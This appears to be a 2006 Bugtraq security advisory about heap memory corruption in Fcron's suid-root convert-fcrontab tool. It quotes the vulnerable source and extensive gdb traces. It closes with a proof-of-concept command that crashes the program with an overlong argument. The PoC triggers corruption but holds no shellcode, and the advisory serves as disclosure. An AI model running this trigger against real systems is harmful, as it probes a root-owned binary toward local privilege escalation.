@@ -1,0 +1,466 @@
+
+Date: 1 Feb 2006 15:10:43 -0000
+From: pi3ki31ny@...pl
+To: bugtraq@...urityfocus.com
+Subject: Fcrontab - memory corruption on heap.
+
+
+Name:                      Fcron - convert-fcrontab
+Vendor URL:                http://fcron.free.fr
+Author:                    Adam Zabrocki <pi3ki31ny@...pl>
+Date:                      November 25, 2005
+
+
+
+
+    Issue:
+
+	Fcron (convert-fcrontab) allow users to corruption on heap section.
+
+
+
+    Description:
+
+	Fcron is a periodical command scheduler which aims at replacing Vixie Cron,
+and implements most of its functionalities.
+
+More information about Fcron is available from http://fcron.free.fr/description.php
+
+
+
+    Details:
+
+	Possible to do heap corruption in suid frcon's program - convert-fcrontab.
+When we call program with long argument, he do corruption by syslog() function
+when function open_memstream() try to alloc memory via malloc() function to argument
+for syslog() function. There is small bugs on heap by using integer overflow:
+
+"convert-fcrontab.c"
+int
+main(int argc, char *argv[])
+{
+    ...
+    ...
+
+
+    ...
+    ...
+
+    user_to_update = strdup2(argv[optind]);
+
+    if (chdir(cdir) != 0)
+        die_e("Could not change dir to " FCRONTABS);
+
+    convert_file(user_to_update);
+
+    exit(EXIT_OK);
+
+}
+
+
+Funtion strdup2() was written by fcron's autors:
+
+"subs.c"
+char *
+strdup2(const char *str)
+{
+    char *ptr;
+
+    if ( str == NULL )
+        return NULL;
+
+    ptr = malloc(strlen(str) + 1);
+
+    if ( ! ptr)
+        die_e("Could not calloc");
+
+    strcpy(ptr, str);
+    return(ptr);
+}
+
+When strlen(str)+1 do in fact small number malloc don't allocate
+enought memory and by function strcpy() we can overwrite some data.
+
+In bug what do memory corruption by syslog() function this call accelerate
+stack (so heap too).
+
+We can do this bug by many calls. The most simple way to use it is write
+bad argument to program:
+
+"convert-fcrontab.c"
+void
+convert_file(char *file_name)
+/* this functions is a mix of read_file() from version 1.0.3 and save_file(),
+ * so you can read more comments there */
+{
+    ...
+    ...
+
+    Alloc(file, cf_t);
+    /* open file */
+    if ( (f = fopen(file_name, "r")) == NULL )
+        die_e("Could not read %s", file_name);
+
+    ...
+    ...
+}
+
+Alloc() accelerate stack/heap too. This function we can saw here:
+
+"global.h"
+#define Alloc(PTR, TYPE) \
+        if( (PTR = calloc(1, sizeof(TYPE))) == NULL ) \
+            die_e("Could not calloc.");
+
+
+Function die_e():
+
+"log.c"
+void
+die_e(char *fmt, ...)
+{
+   va_list args;
+   int err_no = 0;
+
+   err_no = errno;
+
+   va_start(args, fmt);
+   log_e(COMPLAIN_LEVEL, fmt, args);
+   va_end(args);
+   if (getpid() == daemon_pid) error("Aborted");
+
+   exit(err_no);
+
+}
+
+Argument what we deliver to program are still use and now is argument
+for log_e() function:
+
+"log.c"
+static void
+log_e(int priority, char *fmt, va_list args)
+{
+    int saved_errno;
+    char *msg;
+
+    saved_errno=errno;
+
+    if ( (msg = make_msg(strerror(saved_errno), fmt, args)) == NULL )
+        return ;
+
+    log_syslog_str(priority, msg);
+    log_console_str(msg);
+
+    free(msg);
+}
+
+Function make_msg() allocate again memory for own argument:
+
+"log.c"
+char *
+make_msg(const char *append, char *fmt, va_list args)
+{
+    int len;
+    char *msg = NULL;
+
+    if ( (msg = calloc(1, MAX_MSG + 1)) == NULL )
+        return NULL;
+    ...
+    len = vsnprintf(msg, MAX_MSG + 1, fmt, args);
+    ...
+    ...
+}
+
+And function log_syslog_str():
+
+"log.c"
+void
+log_syslog_str(int priority, char *msg)
+{
+    if (dosyslog) {
+        xopenlog();
+        syslog(priority, "%s", msg);
+    }
+
+}
+
+Function xopenlog() call only openlog() function:
+
+"log.c"
+static void
+xopenlog(void)
+{
+    if (!log_open) {
+        openlog(prog_name, LOG_PID, SYSLOG_FACILITY);
+        log_open=1;
+    }
+}
+
+... and in the end function log_syslog_str() call syslog()
+function. Function syslog() in fact call function vsyslog()
+and in many calls there is another call do malloc() function
+to allocate memory for own argument. Let's see what we get
+from gdb:
+
+root@pi3:/News/fcron-3.0.0# gdb -q ./convert-fcrontab
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) r `perl -e 'print "A"x600'`
+Starting program: /News/fcron-3.0.0/convert-fcrontab `perl -e 'print "A"x600'`
+13:12:54 Converting 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
+(truncated)
+*** glibc detected *** malloc(): memory corruption: 0x0804eec0 ***
+
+Program received signal SIGABRT, Aborted.
+0x40084ef1 in kill () from /lib/libc.so.6
+(gdb) bt
+#0  0x40084ef1 in kill () from /lib/libc.so.6
+#1  0x40084b15 in raise () from /lib/libc.so.6
+#2  0x400863fd in abort () from /lib/libc.so.6
+#3  0x400b776c in __libc_message () from /lib/libc.so.6
+#4  0x400c0066 in malloc_printerr () from /lib/libc.so.6
+#5  0x400bebea in _int_malloc () from /lib/libc.so.6
+#6  0x400bd7a3 in malloc () from /lib/libc.so.6
+#7  0x400b6110 in open_memstream () from /lib/libc.so.6
+#8  0x40111d40 in vsyslog () from /lib/libc.so.6
+#9  0x40111caf in syslog () from /lib/libc.so.6
+#10 0x0804a5d8 in log_syslog_str (priority=3, msg=0x804ee08 "Could not read ", 'A' <repeats 146 times>, " (truncated)")
+    at log.c:102
+#11 0x0804a739 in log_e (priority=3, fmt=0x804abcf "Could not read %s", args=0xbffff014 "&#272;&#268;\004\bpz\006@0l\001@�&#344;")
+    at log.c:165
+#12 0x0804a90c in die_e (fmt=0x804abcf "Could not read %s") at log.c:339
+#13 0x0804923a in convert_file (file_name=0x804c8d0 'A' <repeats 200 times>...) at convert-fcrontab.c:153
+#14 0x0804936d in main (argc=134523688, argv=0xbffff677) at convert-fcrontab.c:276
+(gdb)
+
+What we can saw glibc detected memory coruption and send signal SIGABRT
+to exit program.
+
+(gdb) disass syslog
+Dump of assembler code for function syslog:
+...
+0x40111caa <syslog+26>: call   0x40111cc0 <vsyslog>
+...
+(gdb) b vsyslog
+Breakpoint 1 at 0x40111cc6
+(gdb) r `perl -e 'print "A"x600'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /News/fcron-3.0.0/convert-fcrontab `perl -e 'print "A"x600'`
+
+Breakpoint 1, 0x40111cc6 in vsyslog () from /lib/libc.so.6
+(gdb) x/s $ebx
+0x804cb30:       "Converting ", 'A' <repeats 150 times>, " (truncated)"
+(gdb)
+
+So own argument is in %ebx register
+
+(gdb) disass vsyslog
+Dump of assembler code for function vsyslog:
+...
+0x40111cc9 <vsyslog+9>: push   %ebx
+...
+0x40111cd3 <vsyslog+19>:        call   0x400712cd <__i686.get_pc_thunk.bx>
+0x40111cd8 <vsyslog+24>:        add    $0x6331c,%ebx
+...
+0x40111d3b <vsyslog+123>:       call   0x400b60f0 <open_memstream>
+...
+(gdb) x/2i 0x400712cd
+0x400712cd <__i686.get_pc_thunk.bx>:    mov    (%esp),%ebx
+0x400712d0 <__i686.get_pc_thunk.bx+3>:  ret
+(gdb) c
+Continuing.
+13:46:09 Converting 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
+(truncated)
+
+Breakpoint 1, 0x40111cc6 in vsyslog () from /lib/libc.so.6
+(gdb) b *0x400712cd
+Breakpoint 2 at 0x400712cd
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x400712cd in __i686.get_pc_thunk.bx () from /lib/libc.so.6
+(gdb) bt
+#0  0x400712cd in __i686.get_pc_thunk.bx () from /lib/libc.so.6
+#1  0x40111cd8 in vsyslog () from /lib/libc.so.6
+#2  0x40111caf in syslog () from /lib/libc.so.6
+#3  0x0804a5d8 in log_syslog_str (priority=3, msg=0x804ee08 "Could not read ", 'A' <repeats 146 times>, " (truncated)")
+    at log.c:102
+#4  0x0804a739 in log_e (priority=3, fmt=0x804abcf "Could not read %s", args=0xbffff014 "&#272;&#268;\004\bpz\006@0l\001@�&#344;")
+    at log.c:165
+#5  0x0804a90c in die_e (fmt=0x804abcf "Could not read %s") at log.c:339
+#6  0x0804923a in convert_file (file_name=0x804c8d0 'A' <repeats 200 times>...) at convert-fcrontab.c:153
+#7  0x0804936d in main (argc=134523688, argv=0xbffff677) at convert-fcrontab.c:276
+(gdb) b *0x400712d0
+Breakpoint 3 at 0x400712d0
+(gdb) i r esp
+esp            0xbfffeda0       0xbfffeda0
+(gdb) i r ebx
+ebx            0x804ee08        134540808
+(gdb) x/s $ebx
+0x804ee08:       "Could not read ", 'A' <repeats 146 times>, " (truncated)"
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x400712d0 in __i686.get_pc_thunk.bx () from /lib/libc.so.6
+(gdb) i r esp
+esp            0xbfffeda0       0xbfffeda0
+(gdb) i r ebx
+ebx            0x40111cd8       1074863320
+(gdb) x/x $esp
+0xbfffeda0:     0x40111cd8
+(gdb) b *0x40111d3b            // this is address for call open_memstream() function
+Breakpoint 4 at 0x40111d3b
+(gdb) del 2 3
+(gdb) c
+Continuing.
+
+Breakpoint 4, 0x40111d3b in vsyslog () from /lib/libc.so.6
+(gdb) i r ebx
+ebx            0x40174ff4       1075269620
+(gdb) p/x 0x40174ff4-0x40111cd8
+$5 = 0x6331c        // 0x40111cd8 <vsyslog+24>:        add    $0x6331c,%ebx
+(gdb) x/20i 0x400b60f0
+...
+0x400b60f5 <open_memstream+5>:  push   %ebx
+...
+0x400b60f6 <open_memstream+6>:  sub    $0x10,%esp
+0x400b60f9 <open_memstream+9>:  call   0x400712cd <__i686.get_pc_thunk.bx>
+0x400b60fe <open_memstream+14>: add    $0xbeef6,%ebx
+0x400b610b <open_memstream+27>: call   0x400710c4 <_ufc_foobar+221220>
+...
+(gdb) // instruction from 0x400712cd address we saw there is mov (%esp),%ebx
+(gdb) b *0x400b610b
+Breakpoint 5 at 0x400b610b
+(gdb) c
+Continuing.
+
+Breakpoint 5, 0x400b610b in open_memstream () from /lib/libc.so.6
+(gdb) i r ebx
+ebx            0x40174ff4       1075269620
+(gdb) x/20i 0x400710c4  // call   0x400710c4 <_ufc_foobar+221220>
+0x400710c4 <_ufc_foobar+221220>:        jmp    *0x28(%ebx)
+0x400710ca <_ufc_foobar+221226>:        push   $0x38
+0x400710cf <_ufc_foobar+221231>:        jmp    0x40071044 <_ufc_foobar+221092>
+0x400710d4 <_ufc_foobar+221236>:        jmp    *0x2c(%ebx)
+...
+(gdb) x/20i 0x40071044
+0x40071044 <_ufc_foobar+221092>:        pushl  0x4(%ebx)
+0x4007104a <_ufc_foobar+221098>:        jmp    *0x8(%ebx)
+0x40071050 <_ufc_foobar+221104>:        add    %al,(%eax)
+0x40071052 <_ufc_foobar+221106>:        add    %al,(%eax)
+0x40071054 <_ufc_foobar+221108>:        jmp    *0xc(%ebx)
+...
+(gdb) b *0x400710cf
+Breakpoint 6 at 0x400710cf
+(gdb) c
+Continuing.
+*** glibc detected *** malloc(): memory corruption: 0x0804eec0 ***
+
+Program received signal SIGABRT, Aborted.
+0x40084ef1 in kill () from /lib/libc.so.6
+(gdb) bt
+#0  0x40084ef1 in kill () from /lib/libc.so.6
+#1  0x40084b15 in raise () from /lib/libc.so.6
+#2  0x400863fd in abort () from /lib/libc.so.6
+#3  0x400b776c in __libc_message () from /lib/libc.so.6
+#4  0x400c0066 in malloc_printerr () from /lib/libc.so.6
+#5  0x400bebea in _int_malloc () from /lib/libc.so.6
+#6  0x400bd7a3 in malloc () from /lib/libc.so.6
+#7  0x400b6110 in open_memstream () from /lib/libc.so.6
+#8  0x40111d40 in vsyslog () from /lib/libc.so.6
+#9  0x40111caf in syslog () from /lib/libc.so.6
+#10 0x0804a5d8 in log_syslog_str (priority=3, msg=0x804ee08 "Could not read ", 'A' <repeats 146 times>, " (truncated)")
+    at log.c:102
+#11 0x0804a739 in log_e (priority=3, fmt=0x804abcf "Could not read %s", args=0xbffff014 "&#272;&#268;\004\bpz\006@0l\001@�&#344;")
+    at log.c:165
+#12 0x0804a90c in die_e (fmt=0x804abcf "Could not read %s") at log.c:339
+#13 0x0804923a in convert_file (file_name=0x804c8d0 'A' <repeats 200 times>...) at convert-fcrontab.c:153
+#14 0x0804936d in main (argc=134523688, argv=0xbffff677) at convert-fcrontab.c:276
+(gdb) x/i 0x400c0066
+0x400c0066 <malloc_printerr+166>:       jmp    0x400bffea <malloc_printerr+42>
+(gdb) disass malloc_printer
+Dump of assembler code for function malloc_printerr:
+...
+0x400bffcc <malloc_printerr+12>:        mov    %ebx,0xfffffff4(%ebp)
+0x400bffcf <malloc_printerr+15>:        call   0x400712cd <__i686.get_pc_thunk.bx>
+0x400bffd4 <malloc_printerr+20>:        add    $0xb5020,%ebx
+...
+0x400bffea <malloc_printerr+42>:        mov    0xfffffff4(%ebp),%ebx
+...
+(gdb) x/2i 0x400c0061
+0x400c0061 <malloc_printerr+161>:       call   0x400b75a0 <__libc_message>
+0x400c0066 <malloc_printerr+166>:       jmp    0x400bffea <malloc_printerr+42>
+(gdb)
+
+As we can saw 6 break point don't return. Function open_memstream() call malloc() and this function
+do corruption. The adress where is consolidation is 0x0804eec0. But as we can saw the stack pointer
+is moved to %ebx many times. If we controle the stack size we can saw that adress where is corruption
+is moved:
+
+root@pi3:/News/fcron-3.0.0# /News/fcron-3.0.0/convert-fcrontab `perl -e 'print "A"x600'`
+15:11:06 Converting 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
+(truncated)
+*** glibc detected *** malloc(): memory corruption: 0x0804eec0 ***
+Przerwane
+root@pi3:/News/fcron-3.0.0# /News/fcron-3.0.0/convert-fcrontab `perl -e 'print "AA"x600'`
+15:11:09 Converting 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
+(truncated)
+*** glibc detected *** malloc(): memory corruption: 0x0804f118 ***
+Przerwane
+root@pi3:/News/fcron-3.0.0# /News/fcron-3.0.0/convert-fcrontab `perl -e 'print "AAA"x600'`
+15:11:11 Converting 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
+(truncated)
+*** glibc detected *** malloc(): memory corruption: 0x0804f370 ***
+Przerwane
+root@pi3:/News/fcron-3.0.0# /News/fcron-3.0.0/convert-fcrontab `perl -e 'print "AAAA"x600'`
+15:11:19 Converting 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
+(truncated)
+*** glibc detected *** malloc(): memory corruption: 0x0804f5c8 ***
+Przerwane
+root@pi3:/News/fcron-3.0.0#
+
+Crash is in kill() function:
+
+(gdb)
+0x40084ee0 <kill+0>:    mov    %ebx,%edx
+0x40084ee2 <kill+2>:    mov    0x8(%esp),%ecx
+0x40084ee6 <kill+6>:    mov    0x4(%esp),%ebx
+0x40084eea <kill+10>:   mov    $0x25,%eax
+0x40084eef <kill+15>:   int    $0x80
+0x40084ef1 <kill+17>:   mov    %edx,%ebx
+...
+(gdb) i r edx
+edx            0x40174ff4       1075269620
+(gdb)
+
+That's all
+
+
+
+    Exploit:
+
+
+  	Simple Proof of Concept:
+
+root@pi3:/News/fcron-3.0.0# /News/fcron-3.0.0/convert-fcrontab `perl -e 'print "pi3"x600'`
+15:28:13 Converting 
+pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3pi3 
+(truncated)
+*** glibc detected *** malloc(): memory corruption: 0x0804f370 ***
+Przerwane (core dumped)
+root@pi3:/News/fcron-3.0.0#
+
+
+Btw. convert-frontab have suid bit and user/group root by default in trustix Linux.
+
+--
+pi3 (pi3ki31ny) - pi3ki31ny@...pl
+http://www.pi3.int.pl
+
+
